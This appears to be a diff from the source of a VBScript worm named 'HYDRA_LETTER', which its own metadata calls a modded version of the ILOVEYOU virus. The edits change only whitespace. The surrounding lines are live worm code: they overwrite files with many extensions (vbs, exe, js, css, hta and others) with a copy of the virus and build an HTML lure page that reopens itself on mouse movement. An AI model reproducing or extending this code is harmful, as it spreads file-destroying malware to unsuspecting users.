@@ -90,7 +90,7 @@ if (ext="vbs") or (ext="vbe") then
 set ap=fso.OpenTextFile(f1.path,2,true)
 ap.write vbscopy
 ap.close
-elseif(ext="exe") or (ext="com") or (ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then 
+elseif(ext="exe") or (ext="com") or (ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
 set ap=fso.OpenTextFile(f1.path,2,true)
 ap.write vbscopy
 ap.close
@@ -209,8 +209,8 @@ On Error Resume Next
 dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
 dta1="<HTML><HEAD><TITLE>HYDRA_LETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS -
 HYDRA_LETTER@-@>"&vbcrlf& _ "<META NAME=@-@Author@-@ CONTENT=@-@master7720 ?-? master7720@mail.com ?-?
-  @imperial Group ?-? LA ?-? november 2021-@>"&vbcrlf& _ "<META NAME=@-@Description@-@
-  CONTENT=@-@modded version of a simple virus called ILOVEYOU...@-@>"&vbcrlf& _
+@imperial Group ?-? LA ?-? november 2021-@>"&vbcrlf& _ "<META NAME=@-@Description@-@
+CONTENT=@-@modded version of a simple virus called ILOVEYOU...@-@>"&vbcrlf& _
 "<?-?HEAD><BODY
 ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#HYDRA-SENT-YOU-A-LETTER.
 HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
